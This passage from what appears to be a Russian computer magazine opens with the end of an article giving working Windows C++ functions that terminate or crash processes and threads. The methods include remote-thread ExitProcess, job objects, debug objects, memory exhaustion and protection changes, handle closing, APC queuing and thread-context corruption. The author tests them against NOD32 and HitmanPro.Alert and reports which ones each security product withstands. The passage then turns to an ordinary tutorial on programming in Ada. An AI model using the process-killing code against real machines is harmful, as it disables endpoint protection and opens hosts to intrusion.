    HANDLE hProc = get_process_handle(pid, PROCESS_TERMINATE);  //
Обрати внимание на режим доступа — мы не просим ничего лишнего
    if (!NtTerminateProcess(hProc, 0))
    {
#ifdef DEBUG
        std::cout << "NtTerminateProcess error: " << GetLastError() <
< std::endl;
#endif
        return FALSE;
    }
    return TRUE;
}

Разумеется, ESET NOD32 Smart Security и HitmanPro.Alert легко про тивостоят
такому  простому  трюку  и  выводят  сооб щение  ERROR_ACCESS_DENIED
при попытке их завершения. Зато бра узер Firefox с удовольствием зак рыва‐
ется. :)
  Следующий спо соб закрыть процесс — создать поток в инте ресу ющем
нас про цессе при помощи функции CreateRemoteThread и запус тить этим
потоком фун кцию ExitProcess. Вот код функции:


BOOL kill_proc2(IN DWORD pid)
{
    HANDLE hProc = get_process_handle(pid, PROCESS_CREATE_THREAD |
PROCESS_VM_OPERATION);
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    if (!hKernel32)
        return FALSE;
    void *pExitProcess = GetProcAddress(hKernel32, "ExitProcess");
    if (!pExitProcess)
        return FALSE;
    HANDLE hThread = CreateRemoteThread(hProc,
                        NULL,
                        0,
                        (LPTHREAD_START_ROUTINE)pExitProcess,
                        NULL,
                        0,
                        NULL);
    if (!hThread)
    {
#ifdef DEBUG
        std::cout << "CreateRemoteThread error: " << GetLastError() <
< std::endl;
#endif
        return FALSE;
    }
    return TRUE;
}

Как вид но из кода, вначале мы получаем PID про цесса с правами PRO‐
CESS_CREATE_THREAD | PROCESS_VM_OPERATION (лишние права не берем),
далее получаем адрес функции ExitProcess из биб лиоте ки kernel32.dll и,
наконец, передаем его в фун кцию CreateRemoteThread. Firefox закрывается,
а защитные решения показывают стойкость к этому приему.
  Следующий спо соб будет манипулиро вать с заданиями (job) при помощи
функций CreateJobObject → AssignProcessToJobObject → Terminate‐
JobObject. Сна чала код, потом я расскажу, что он делает.


BOOL kill_proc3(IN DWORD pid)
{
    HANDLE hProc = get_process_handle(pid, PROCESS_SET_QUOTA | PROCES
S_TERMINATE);
    HANDLE job = CreateJobObjectA(NULL, NULL);
    if (!job)
    {
#ifdef DEBUG
        std::cout << "CreateJobObjectA error: " << GetLastError() <<
std::endl;
#endif
        return FALSE;
    }
    if (!AssignProcessToJobObject(job, hProc))
    {
#ifdef DEBUG
        std::cout << "AssignProcessToJobObject error: " << GetLas
tError() << std::endl;
#endif
        return FALSE;
    }
    if (!TerminateJobObject(job, 0))
    {
#ifdef DEBUG
        std::cout << "TerminateJobObject error: " << GetLastError() <
< std::endl;
#endif
        return FALSE;
    }
    return TRUE;
}

Итак, сначала мы создаем объект задания функцией CreateJobObjectA.
Объект задания — это такой объект ядра, который поз воляет работать с груп‐
пой процессов. Ну а в данном случае группа про цессов будет сос тоять
из одного процесса. :) Далее функци ей AssignProcessToJobObject мы свя‐
зываем наш про цесс с созданным объ ектом задания.
  Функцией TerminateJobObject мы можем завершить все процес сы,
которые связаны с объектом задания (в нашем слу чае один про цесс). Резуль‐
тат выполнения этой под программы таков: NOD32 успешно выдержал эту ата‐
ку, бра узер Firefox зак рылся, и также закрылся процесс HitmanPro.Alert.
  Переходим к следующему способу завершения процессов: в этот раз мы
притворимся отладчиком! :)


BOOL kill_proc4(IN DWORD pid)
{
    HANDLE hProc = get_process_handle(pid, PROCESS_SUSPEND_RESUME);
    HANDLE dbg_obj = NULL;
    NTSTATUS status = NtCreateDebugObject(&dbg_obj, 0x2, NULL, 0x1);
    status = NtDebugActiveProcess(hProc, dbg_obj);
    CloseHandle(hProc);
    return TRUE;
}

Здесь мы создаем объект отладки, используя функцию NtCreateDebugOb‐
ject. Чтобы понимать, что происходит, оста новимся на ней немного под‐
робнее. Вот ее прототип:


NTSYSAPI
NTSTATUS
NTAPI
NtCreateDebugObject(
OUT PHANDLE             DebugObjectHandle,
IN ACCESS_MASK          DesiredAccess,
IN POBJECT_ATTRIBUTES   ObjectAttributes OPTIONAL,
IN BOOLEAN              KillProcessOnExit );

Параметр DebugObjectHandle — это хендл объекта отладки, который мы
передаем по ссыл ке. Далее идет маска доступов, которую мы выставля ем
в 0x2, что значит DEBUG_OBJECT_PROCESSASSIGN, третье поле атрибутов
оставляем пустым, а четвертое ставим в 0x1 — это значит KillProcessOnEx‐
it.
   Теперь присоеди няем соз данный объект отладки к процессу функцией
NtDebugActiveProcess. Если пос ле этого закрыть хендл, процесс должен
быть завер шен опе раци онной системой. Хендл закрыва ем как всегда —
CloseHandle. После этого подопытный Firefox закрывается без проблем,
как и HitmanPro.Alert. Но NOD32 по‐прежнему выдерживает наш натиск.
   Теперь попробуем заставить закрыться приложение, заняв всю его
память. Сначала код.


BOOL kill_proc5(IN DWORD pid)
    {
        HANDLE hProc = get_process_handle(pid, PROCESS_VM_OPERATION);
        unsigned int count = 0;
        size_t sz = 0x400000000;    // 16 Гбайт
        while (sz >= 0x1000)
        {
            void *mem = VirtualAllocEx(hProc,
                            NULL,
                            sz,
                            MEM_RESERVE,
                            PAGE_READONLY);
            if (mem) count++;   //
            else sz /= 2;       // Будем занимать память до
последнего
        }
        CloseHandle(hProc);
        return TRUE;
    }

Тут все просто: при помощи функции VirtualAllocEx мы пытаемся занять
всю доступную память в приложении с флагом PAGE_READONLY, то есть дос‐
тупной только для чтения. От этих действий Firefox зависает и падает ОС,
а защитные программы продолжают работать и не позволяют разрушить себя
таким обра зом.
  Следующий способ похож на предыдущий. Изменим атрибуты доступа
в памяти приложения на PAGE_NOACCESS при помощи функции Virtual‐
QueryEx → VirtualProtectEx. Код:


BOOL kill_proc6(IN DWORD pid)
{
    HANDLE hProc = get_process_handle(pid, PROCESS_QUERY_INFORMATION
| PROCESS_VM_OPERATION | SYNCHRONIZE);
    void* address = NULL;
    while (address < 0x80000000000)
    {
        MEMORY_BASIC_INFORMATION mem_bi;
        DWORD mem = VirtualQueryEx(hProc,
                        address,
                        &mem_bi,
                        sizeof(mem_bi));
        if (mem)
        {
            if (mem_bi.State == MEM_COMMIT)
            {
                DWORD protect_state;
                VirtualProtectEx(hProc,
                        mem_bi.BaseAddress,
                        mem_bi.RegionSize,
                        PAGE_NOACCESS,
                        &protect_state);
            }
            address = (void*)(mem_bi.BaseAddress + mem_bi.RegionSize)
;
        }
        else break;
    }
    CloseHandle(hProc);
    return TRUE;
}

Здесь мы сначала в цик ле получа ем нужную информацию функцией Virtual‐
QueryEx, а потом меняем атрибут защиты региона памяти приложения
на PAGE_NOACCESS функцией VirtualProtectEx. Нес мотря на схожесть
с предыдущим  методом,  этот подход  обру шивает одно  из защит ных
решений — HitmanPro.Alert и браузер. NOD32 остается непоколебим.
  Следующий  метод  будет  использовать  функцию  DuplicateHandle
с параметром DUPLICATE_CLOSE_SOURCE, чтобы зак рыть все хендлы про цесса
и вызвать в нем ошибки.


BOOL kill_proc7(IN DWORD pid)
{
    HANDLE hProc = get_process_handle(pid, PROCESS_DUP_HANDLE);
    int i = 0;
    while ( i < 0x10000 )
    {
        HANDLE hndl = (HANDLE)i;
        HANDLE dublicate_h = NULL;
        if (DuplicateHandle(hProc, hndl, GetCurrentProcess(), &dublic
ate_h, 0, FALSE, DUPLICATE_CLOSE_SOURCE))
        {
            i++;
            CloseHandle(dublicate_h);
        }
    }
    CloseHandle(hProc);
    return TRUE;
}

После того как мы пройдемся функцией DuplicateHandle с параметром DU‐
PLICATE_CLOSE_SOURCE по 10 000 хен длов, Firefox упадет, а защитные прог‐
раммы не пос традают.
   Итак, мы рассмотрели способы воздействия на сами процессы по их PID.
Теперь перейдем непосредственно к потокам.


СПОСОБЫ ЗАВЕРШЕНИЯ ПОТОКОВ
Для начала надо будет получить список потоков в нужном процессе.
Это очень похоже на получение процессов, поэтому сильно заос трять вни‐
мание на этом я не стану, хотя некоторые моменты необходимо прояснить.
Листинг функции получения потоков я снабжу коммента риями, обрати на них
внимание.


BOOL get_threads(IN const char * pProcName)
{
    // Для получения списка потоков мы используем ту же функцию, что
и для получения
    // списка процессов, только передаем ей параметр TH32CS
_SNAPTHREAD
    HANDLE pTHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    ULONG process_tid[256];
    int tid_count = 0;
    int number_of_threads = 0;
    THREADENTRY32 ThreadEntry;
    ThreadEntry.dwSize = sizeof(ThreadEntry);
    DWORD pid = get_pid_from_name(pProcName);
    // Используем похожие функции для потоков, как и в случае с
процессами
    if (Thread32First(pTHandle, &ThreadEntry))
    {
        do{
            if (ThreadEntry.dwSize >= FIELD_OFFSET(THREADENTRY32,
th32OwnerProcessID) +
                sizeof(ThreadEntry.th32OwnerProcessID)) {
                // Здесь определяем потоки для нужного нам процесса
                if (ThreadEntry.th32OwnerProcessID == pid)
                {
                    process_tid[*tid_count] = ThreadEntry.th32Th
readID;
#ifdef DEBUG
                    std::cout << "PID: " << pid << " " << "ThreadID:
" << process_tid[*tid_count] << std::endl;
#endif
                    *tid_count = *tid_count + 1;
                    ++number_of_threads;
                }
            }
            ThreadEntry.dwSize = sizeof(ThreadEntry);
        } while (Thread32Next(pTHandle, &ThreadEntry));
#ifdef DEBUG
        std::cout << "Number Threads: " << number_of_threads << std::
endl;
#endif
        // Процесс один, а потоков несколько. Поэтому используем
цикл, чтобы обойти их все
        for (; number_of_threads > 0; ‐‐number_of_threads)
        {
            //kill_threads1(tids[number_of_threads]);   // В этом
цикле мы будем помещать функции убийства потоков
            //kill_threads2(tids[number_of_threads]);
            //kill_threads3(tids[number_of_threads]);
#ifdef DEBUG
            std::cout << "Thread kill: " << number_of_threads << std:
:endl;
#endif
        }
    }
    return TRUE;
}

При помощи этой фун кции мы будем взаимо действовать с потоками нужных
нам процессов.
   Итак, пер вый способ завершения потоков очень похож на тот, который мы
использовали с процессами. Это открытие тредов при помощи функции
OpenThread с парамет ром THREAD_SET_CONTEXT. Далее идет получение
адреса ExitProcess и передача его в функцию QueueUserAPC, чтобы она
попала в оче редь потока.
  Похожий способ был с процессами, только использовалась функция Cre‐
ateRemoteThread.  Фун кция  QueueUserAPC  позволяет  выполнять  код
в адресном пространс тве нуж ного процесса, в контексте его потока. Код
реализации простой:


BOOL kill_threads1(IN DWORD tid)
{
    HANDLE hTread = OpenThread(THREAD_SET_CONTEXT,
        FALSE,
        tid);
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    if (!hKernel32)
        return FALSE;
    void *pExitProcess = GetProcAddress(hKernel32, "ExitProcess");
    if (!pExitProcess)
        return FALSE;
    if (!QueueUserAPC((PAPCFUNC)pExitProcess, hTread, 0))
    {
#ifdef DEBUG
        std::cout << "QueueUserAPC error: " << GetLastError() << std:
:endl;
#endif
        return FALSE;
    }
    return TRUE;
}

Я уже думал, что NOD32 SS нам не удастся сломить ничем, но здесь он дрог‐
нул. У нас все‐таки получилось разрушить его потоки, вызвать зависа ние
и дальнейшее аварийное завершение. Что интересно, HitmanPro.Alert выдер‐
жал эту ата ку, ну а Firefox, конечно, рухнул.
  Переходим к следующе му способу. Он проще: будем просто открывать
треды процессов и пытать ся завершить их при помощи TerminateThread:


BOOL kill_threads2(IN DWORD tid)
{
    HANDLE hThread = OpenThread(THREAD_TERMINATE,
        FALSE,
        tid);
    if (!TerminateThread(hThread, 0))
    {
#ifdef DEBUG
        std::cout << "TerminateThread error: " << GetLastError() <<
std::endl;
#endif
        return FALSE;
    }
    return TRUE;
}

Способ простой и не очень эффективный, осо бенно против серьезных прог‐
рамм: таким образом удалось убить только Firefox, остальные приложения
выдержали ата ку.
  И последний способ, который мы рассмотрим, — это попыт ка сме нить
контекст потока (функция SetThreadContext) с прыж ком в нулевые данные.
Это должно вызвать ошиб ку и ава рийное завершение приложе ния.


BOOL kill_threads3(IN DWORD tid)
{
    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT,
                        FALSE,
                        tid);
    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));       // Выделяем память ctx и
заполняем ее нулями
    ctx.ContextFlags = CONTEXT_CONTROL;
    SetThreadContext(hThread, &ctx);    // Меняем контекст
    CloseHandle(hThread);
    return TRUE;
}

Надо сказать, что все защитные решения выдержали этот трюк, погиб только
несчастный браузер.


ЗАКЛЮЧЕНИЕ
В этой статье мы рассмотрели несколько способов завершения потоков
и процессов, нем ного разобрались, как Windows работает с ними, и выяс‐
нили, что даже защитные решения порой не могут себя защитить. Но,
как известно, чтобы создать хорошую защиту, нужно исклю чить все сла бые
места, а чтобы сделать успешную атаку — нужно найти всего одно слабое
место. С чем мы и справились! :)
КОДИНГ





    Даниил Батурин
Координатор проекта VyOS
(https://vyos.io), «языковед»,
 функциональщик, иногда
  сетевой администратор.
      daniil@baturin.org


     МИФЫ ОБ
     АДЕ

                        КАК И ЗАЧЕМ
          ПРОГРАММИРОВАТЬ НА АДЕ
             В СОВРЕМЕННОМ МИРЕ





Язык, раз работан ный по  заказу Минис терства обороны
США и наз ванный в честь пер вой в мире программистки Ады
Лавлейс, окружают мно го мифов и непони мания. Ты навер‐
няка о нем слы шал, но, скорее все го, это были мифы
об уста рев шем, сложном и мед ленном язы ке. Однако ада
активно используется для управле ния самолетами, поез‐
дами, кос мичес кими аппаратами и про чими интересными
штуками. Давай пос мотрим на язык без призмы мифов
и разберемся, какую пользу мы можем из него извлечь, даже
если пока не собира емся в космос.


             INFO

                      Несмотря на свое американское происхождение,
                        в раз гар холод ной войны ада использовалась и в
                     СССР. На нее даже существу ет ГОСТ, который
                         стоит почитать ради одной только терминологии:
                       например, исклю чения там «возбуждаются».



МИФЫ ОБ АДЕ
Миф об устаревшем языке опровергается одним запросом к поисковику:
последняя редак ция вышла в 2012 году. Если судить о сложности язы ка
по внешним признакам, то все тоже не так страшно: спецификация ады
содержит чуть менее тысячи страниц, тогда как спецификация C++ — око‐
ло 1400 страниц.
  Миф о низкой производительнос ти пошел со времен первой редак‐
ции 1983 года, когда массовому пользовате лю были доступны разве что ZX
Spectrum и IBM PC с i8086, на которых любой современный язык был бы мед‐
ленным. Ада компилируется в машинный код, и любители успешно пишут
на ней для Arduino с ATmega328 и прочих микроконтроллеров.
   Распространен ный миф  о  том,  что  по  вине  ады  упала  ракета
 Ariane 5 в 1996 году, нуж но рассмотреть отдельно. Ракета действитель но упа‐
ла из‐за ошибки, но проблема была в другом: компьютер, который управлял
 траекторией полета, был взят из Ariane 4 без изменений, несмотря на то что
 Ariane 5 поддерживала более широкий диапазон траекторий. Хуже того, про‐
верка на выход значений за возможный диапазон была намеренно отклю‐
 чена, поэто му, когда навигацион ный компьютер выдал недопустимую с точки
зрения Ariane 4 команду, закончилось все предсказуемо. От этой проблемы,
 увы, не смог бы защитить ни один язык или какое‐либо прог рам мное
решение  вооб ще. Сама  Ariane  4  совершила  113  успешных  полетов
из 116 за свою историю, а Ariane 5 уже 96 успешных из 101.


        WWW

                       Если  интерес но,  почитай  отчет  об  аварии
                           Ariane 5.



ЯЗЫКИ И НАДЕЖНОСТЬ ПРОГРАММ
Ракеты — это пре дельный случай требований к надежности программ, но и
 в куда более приземленном коде ошибки могут обойтись пользователям
очень дорого. В уязвимостях вроде Heartbleed можно винить разработчиков,
но разве смысл компьюте ров не в том, чтобы автоматизировать нудную
работу и позволить людям сосредото читься на твор ческих задачах?
   Ада разрабатывалась именно для написания надежных и безопасных
программ. Когда говорят о безопасности, прежде всего думают, какие огра‐
ничения язык или другой инструмент накладывает на пользователя. На мой
 взгляд, в первую очередь нуж но говорить о том, какие вырази тельные средс‐
 тва инс тру мент дает разработ чику, чтобы точ но отразить объекты реального
мира в коде и определить законы их взаимодействия. Наблюдение за выпол‐
нением этих законов лучше поручить ком пилятору — он не устает к кон цу
рабочего дня.
   В первую очередь, конечно, инструмент не должен делать работу человека
сложнее, чем она и так есть. Когда Минис терс тво обороны США разрабаты‐
вало требования к новому языку для конкурса, в котором победила ада, они
 в первую очередь упомянули об этом. Документ с требованиями известен
 как Steelman и содер жит, например, такую фра зу: «Одни и те же символы
и ключевые слова не должны иметь разные значения в разном контексте».
Почти вся первая часть рассказывает о необходимости однозначности син‐
 таксиса, удо бочи таемости кода, определенности семантики и поведения
(вспомним i++ + ++i).
   Но и требования к выразительным средствам для своего времени там
передовые. Любопытно, что обработка исключений и средства обобщенного
программирования были еще в пер вой редакции, задол го до С++.
   Давай напишем первую несложную прог рамму, а потом рассмотрим,
 какие средства ада предоставляет, чтобы точнее выразить в коде свои
намерения.


РЕАЛИЗАЦИИ
Далеко идти за реализацией не придется: компилятор ады включен в GCC
под наз вани ем GNAT (GNU New [York University] Ada Translator) и доступен
на всех системах, где есть GCC.
   Если у тебя Linux или FreeBSD, можешь ставить из стандар тных репози‐
ториев. В Debian/Ubuntu пиши apt‐get install gnat, в Fedora — dnf in‐
stall gnat.
   Компания AdaCore предоставляет ком мерческую поддержку для GNAT
и занимается дру гими связанными проектами. Например, там работают
над гра фичес кой средой разработ ки GNAT Programming Studio (GPS). Ada‐
Core является, по сути, основным разработчиком GNAT и рас пространяет две
версии компилято ра: сертифицированный GNAT Pro за деньги и GNAT Libre
бесплатно, но с рантайм‐библиотекой под лицензией GPLv3.


             INFO

                     Использование GPLv3 не позволя ет раз рабаты‐
                         вать прог раммы с любыми лицензиями, кроме
                       GPL. Однако в дистрибутивы свободных ОС вклю‐
                        чена версия FSF GNAT, лицензия которой делает
                      исключение для библиотек. Так что ее можно
                       использовать для разработки программ с любой
                       лицензией.


 Есть еще проп риетарные реализации ады вроде Irvine и Green Hills, но для
пользователей вне аэрокос мической отрасли и ВПК они малодос тупны и осо‐
бого инте реса не представляют.


ПЕРВАЯ ПРОГРАММА
Традиционный Hello world дает очень мало представления о языке, поэтому
для первой прог раммы мы возьмем что‐нибудь более реалистичное, нап‐
ример алгоритм Пардо — Кнута. Дональд Кнут и Луис Трабб Пардо пред‐
ложили его как раз для этой цели.
 1. Прочитать одиннадцать чисел со стандартного ввода.
 2. При менить  к ним всем  некоторую фун кцию и вывести  результаты
   в обратном порядке.
 3. Если применение функции вызвало переполнение, вывести сообщение
   об ошибке.

С помощью такой программы уже можно показать, как опре делить и запол‐
 нить массив, как написать и вызвать фун кцию, как использовать цик лы и усло‐
вия и как использовать ввод‐вывод. Опять же, если Hello world у любого прог‐
раммис та выглядит почти оди наково, то тут уже есть возможность применить
разные спо собы и показать разные возможнос ти язы ка.
  Мы немного усложним задачу и будем заод но про верять правильность
ввода значения и запрашивать их заново, если ввод был некорректным. Вер‐
 нее, на уровне системы типов ограничим диапазон допустимых значений
и обработаем возникшие исключения.
   Вот наша программа. Ее нуж но будет сохранить в файл с наз ванием par‐
do_knuth.adb. Несовпадение имени файла с именем основной процедуры,
которая слу жит точкой входа, вызовет предупреждение компилятора.


‐‐ Trabb Pardo‐Knuth program
with Ada.Text_IO; use Ada.Text_IO;
with Ada.Strings.Unbounded;
with Ada.Text_IO.Unbounded_IO;
procedure Pardo_Knuth is
    package UIO renames Ada.Text_IO.Unbounded_IO;
    package US renames Ada.Strings.Unbounded;
    type Small_Float is new Float range ‐100.0 .. 100.0;
    package Float_IO is new Ada.Text_IO.Float_IO (Small_Float);
    function Square (X : Small_Float) return Small_Float is
    begin
   return X * X;
    end Square;
    Input : Array (0 .. 10) of Small_Float;
    Index : Integer := 0;
    Debug : Boolean := False;
begin
    if Debug then
        Put_Line ("Pardo‐Knuth program is started");
    else
        Put_Line ("Welcome to Pardo‐Knuth program written in Ada!");
    end if;
     Input_Loop: while Index <= Input'Last loop
        declare
            Raw_Value : US.Unbounded_String;
        begin
            Put ("Enter a value: ");
            UIO.Get_Line (Raw_Value);
            Input(Index) := Small_Float'Value (US.To_String (Raw_Va
lue));
            Index := Index + 1;
        exception
            when Constraint_Error =>
            begin
                Put_Line ("Incorrect value! Enter a number from ‐100
to 100");
            end;
        end;
    end loop Input_Loop;
    Put_Line ("Results:");
    for I in reverse Input'Range loop
        declare
            ‐‐ No declarations
        begin
            Float_IO.Put (Square (Input(I)), Exp => 0, Fore => 4, Aft
 => 2);
        exception
            when Constraint_Error => Put_Line ("Overflow occured!");
        end;
        New_Line;
    end loop;
end Pardo_Knuth;

Скомпилировать прог рамму можно командой gnatmake pardo_knuth.adb.
Созданный исполняемый файл будет называться pardo_knuth.
   Замечу, что син таксис ады нечувствителен к регистру символов. В стан‐
дартной библиотеке GNAT по каким‐то причинам укоренился непривыч ный
Смешанный_Регистр, и я сле дую стилю стандартной библиотеки. Но если
 кому‐то он кажется неэстетичным, можно использовать любой другой по вку‐
 су — на работу программ это не пов лияет.


Заголовок программы
Перед началом программы находится комментарий. Все ком ментарии в аде
однострочные и начинаются с символов ‐‐.
   Программа начинается с подключения модулей. Теперь гибкими воз‐
можностями их подключения никого не удивишь, но ада была одним из пер‐
вых языков, где такое стало возможно.
   Ключевое слово use дела ет модули видимыми в пространс тве имен прог‐
раммы. Нап ример, после with Ada.Text_IO мы могли бы вызывать про цеду‐
 ру Ada.Text_IO.Put_Line по ее полному имени. Но мы использовали конс‐
 трукцию use  Ada.Text_IO, которая импортирует все публичные сим волы
 этого модуля в наше пространство имен, поэто му мы можем вызвать Put_‐
Line, Put и New_Line без имени модуля.


Рас простра нен ные фун кции из Ada.Text_IO
 • Put_Line — выводит дан ные с символом новой строки на конце.
 • Put — выводит дан ные без переноса строки.
 • New_Line — выводит символ переноса строки.



Модули Ada.Strings.Unbounded и Ada.Text_IO.Unbounded_IO предназна‐
чены для работы со строками произвольной длины. По умолчанию стро ки
 в аде фик сированной длины, что не всегда удобно для обработки поль‐
 зовательского ввода. Строки произвольной длины легко преобра зовать
 в фиксированные, что неред ко приходится делать, потому что многие фун‐
кции стан дартной библиотеки ожидают именно фиксированные.
   Дальше мы определя ем основную процедуру, которая служит точ кой входа
 в нашу программу. Желательно, чтобы ее имя совпадало с име нем файла,
 хотя и не обязатель но. В аде есть различие меж ду функциями и процедурами:
функции могут возвращать значения, а процеду ры — только изменять
переменные, которые им переда ют в аргументах.
   Внутри нашей процедуры мы переименовали модули с длинными именами
для удобства, аналогично import foo as bar в Python. Теперь мы сможем
 вызывать, к примеру, Ada.Strings.Unbounded.To_String как US.To_String.
   Алгоритм Пар до — Кнута требует сообщать пользователю о перепол‐
 нении. Чтобы упростить появление переполнений, мы создали намеренно
ограничен ный  тип‐диапазон  Small_Float,  с  возможными  значениями
 от ‐100.0 до +100.0. Для таких типов у ады есть встроенные проверки: прис‐
воение недопустимой константы в коде приведет к ошибке ком пиляции,
а появление недопустимых зна чений в ходе работы программы вызовет
исключение.


             INFO

                      Ада использует именную, а не струк турную экви‐
                        валентность типов, то есть два типа с разными
                     именами несовместимы, даже если объявлены
                      одинаковым образом, и их нельзя использовать
                        в одном выраже нии без явного приведения. Эту
                       особенность час то используют, чтобы выразить
                        логическую несовместимость величин, например
                       предотвратить  случайное  сло жение  дюймов
                        с сантиметрами.


Строка «package Float_IO is new Ada.Text_IO.Float_IO (Small_Float)» заслужива‐
 ет отдельного внимания. Это уже не простое переименова ние, а специали‐
зация обобщенного (generic) модуля для нашего типа Small_Float.
   В аде нет аналога printf, что бывает очень неудобным, но для ее целей
выглядит оправданным — типобезопасный форматированный вывод воз‐
можен толь ко в языках с совершенно дру гой сис темой типов. В С printf(
"%d", "foo") вызовет segmentation fault, в Go аналогичная конс трукция при‐
ведет к ошибке времени выпол нения — ни то ни другое в критичной
по надежности программе не принесет пользовате лю особой радости.
Поэтому хотя бы для относительного удобства авторы стандартной библиоте‐
 ки ады написали несколько модулей для вво да и вывода зна чений рас‐
пространенных типов.
   Для алгоритма Пар до — Кнута нам требует ся определенная пользовате‐
лем функция. Функции и про цеду ры в аде могут быть вложенными, чем мы
и вос поль зуем ся и определим простейшую функцию Square в заголов ке
основной про цедуры нашей программы. Тип возвращаемых значений ука зан
с помощью return  Small_Float. Это обя затель ная часть синтаксиса —
еще раз отметим, что создать функцию, которая не возвращает значений,
невозможно, для этой цели нужно использовать процедуры.
   Далее идут объявле ния переменных. В аде все переменные дол жны быть
объявлены перед использованием. Глобаль ных переменных в смыс ле C в ней
 нет, их область видимости всегда чем‐то огра ничена: пакетом (то есть
модулем), процедурой, функцией или бло ком declare, который мы рассмот‐
рим позже. Видимые внутри всей процедуры перемен ные должны быть объ‐
явлены в ее заголовке, что мы и сделаем.
  С помощью Input : Array (0 .. 10) of Small_Float мы объявляем
массив Input, где будут храниться введенные пользовате лем значения. Мы
используем диапазон индексов от 0 до 10, но вообще индексы могут быть
любыми, в том чис ле отрицательными, нап ример от ‐5 до 5. Еще вместо
явных индексов можно было бы создать целочисленный тип‐диапазон и сос‐
 латься на него.
   Переменная Index, очевид но, будет исполь зоваться как индекс эле мента
массива в цикле — мы могли бы объявить ее позже, но для демонс тра ции
 оставим ее здесь. Ее начальное значение — ноль, присваивается одновре‐
менно с объявлением переменной. Все присваивания в языке производятся
с помощью оператора :=, оператор = используется только для провер ки
равенства.


             INFO

                      Для операто ра «не равно» использует ся символ
                    /=. Впол не вероятно, что Haskell заимствовал его
                        из ады.


Переменная Debug будет служить только для демонстрации условного опе‐
ратора. Она имеет тип Boolean с возможными значени ями True и False.
Условный опе ратор в аде требует выраже ния логичес кого типа и никакого
другого, при выч ное в C‐подобных языках if(0) вызовет ошибку — никакие
неоднознач ности,  связанные с интерпретацией произвольных зна чений
 в логичес ком кон тек сте, в этом языке возникнуть не могут.
   Заголовок основной процедуры нашей программы наконец закончился —
переходим к ее телу.


                                      Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ

     МИФЫ ОБ АДЕ
             КАК И ЗАЧЕМ ПРОГРАММИРОВАТЬ НА АДЕ
                        В СОВРЕМЕННОМ МИРЕ





Те ло прог раммы
Мы начинаем программу с довольно глупой демонстрации условного опе‐
ратора — выводим другое при ветствие, если переменная Debug выставлена
в True. Этого не произой дет, если не поменять ее началь ное значение
руками, но суть не в этом, а в синтаксисе. Условный оператор име ет вид if <
условие>  then  <высказывание>  else  <высказывание>  end  if. Часть
про end if обязательна. Вообще, в аде поч ти нигде нельзя написать прос то
end, не указав, что именно здесь закончилось. Читать такой исходный код
куда про ще, хоть писать и дольше, но пра виль ная нас тройка редак тора реша‐
ет эту проб лему. В объявлении функции Square мы уже видели, что она кон‐
чается словами end Square, хоть и не заостряли на этом внимание.


             INFO

                    Компилятор  удаляет  заведомо  недостижимый
                          код, как внутри if Debug, из исполняемых фай‐
                          лов, но только после проверки всех типов и всего
                      прочего, что можно проверить на этапе ком‐
                       пиляции. Такие константы — стандартный способ
                      реализации feature toggles и отладочного кода,
                        куда более безопасная альтернатива условной
                     компиляции с помощью препроцес сора. Конечно,
                        такой под ход не работа ет для машинно зависи‐
                      мого кода, который просто не скомпилируется
                       вне его целевой платформы. В этом слу чае мож‐
                      но  исполь зовать  внешний  препроцессор  —
                          gnatprep.


Для цик лов можно даже указать имена: цикл ввода переменных объявлен
с помощью  Input_Loop:  while  ...  loop  и  закон чен  end  loop
Input_Loop. Перепу тать границы вложенных циклов при таком под ходе очень
сложно. Синтаксис циклов радует своим единообрази ем — циклы с предус‐
ловием и циклы с парамет ром отличаются только словами перед ключевым
словом loop.


Бес конеч ный цикл
Бесконечный цикл создать очень просто: не указывать ни тип, ни условия.


 loop
     Put_Line ("This loop never ends!");
 end loop;


Циклов с постусловием в явном виде нет, но можно указать условие выхода
внутри тела цикла:


 Counter := 0;
 My_Loop: loop
     Counter := Counter + 1;
     exit My_Loop when Counter > 10;
 end loop My_Loop;




Условие цикла — while Index <= Input'Last — требует некото рых пояс‐
нений. Мы могли бы явно ука зать максимальное значение индекса, но вместо
этого мы используем атрибут нашего массива Last, возвращающий мак‐
симальное значение его индекса. Минимальное зна чение можно получить
с помощью атрибута First, так что эту часть нуд ной работы компилятор
делает за нас. Чуть позже мы остановим ся на атрибутах подробнее.
   Внутри цик ла Input_Loop мы читаем переменные и помеща ем их в наш
массив Input. Специально для промежуточного хранения поль зовательского
ввода мы создадим локаль ную переменную Raw_Value. Поскольку объявлять
переменные где при дется в аде нельзя, нам пот ребуется блок declare,
который соз дает отдель ную область видимости.
  Между declare и begin можно добавить любые объявления, которые мы
могли бы поместить в заголовок процедуры. В нашем случае это единствен‐
ная переменная Raw_Value : Ada.Strings.Unbounded.Unbounded_String
(пакет, который мы для удобства переименовали в US). Это тип динамических
строк неограниченной длины, которые мы читаем с помощью функции UIO.
Get_Line.
  В вычислениях с плавающей точкой от строковых дан ных никакой пользы,
поэтому нам нужно конвертировать эти строки в числа. Мы могли бы исполь‐
зовать функции из пакета Float_IO или даже опре делить потоки вво‐
да‐вывода, но мы пойдем другим путем — используем функцию‐атрибут
нашего типа Small_Float.
   Атрибуты — одна из самых необычных концепций ады. В общих чертах
это ассоциирован ные с типами функции. Имя типа можно рассмат ривать
как своеобразное пространство имен — атри бут отделяется от него апостро‐
фом. В дан ном случае мы используем атрибут Small_Float'Value, который
представляет собой функцию от типа String и возвра щает значения типа
Small_Float.
  Нашу динами чес кую строку мы для этого конвертируем в статическую,
поэтому все выражение имеет вид Small_Float'Value (US.To_String (
Raw_Value)).
  Противоположность атри буту Value — атрибут Image, который конверти‐
рует зна чение в строку. Сущес твует множество других атрибутов, например
для получения размера значений типа в битах, но мы не будем их рас смат‐
ривать — про них можно прочитать в документации.
   Что произойдет, если ввод будет некорректным, например если поль‐
зователь введет foo вместо числа или число, выходящее за границы диапа‐
зона? Фун кция Small_Float'Value завершится с исключением Constrain‐
t_Error. Это исключение нужно обработать, что мы и делаем в конце блока
declare, после ключевого слова exception. Экви вален та try ... catch
в аде нет, обработку исключений мож но производить только в кон це про‐
цедур и функций или, если мы хотим обработать их внут ри функции, в конце
блоков declare.


             INFO

                    Исключения в аде не являются ни классами,
                      ни объектами. Это делает невозможным создание
                      иерархий исключений, но уменьшает накладные
                       расходы на их обработ ку. Создать свое исклю‐
                       чение можно с помощью вот такой конструкции
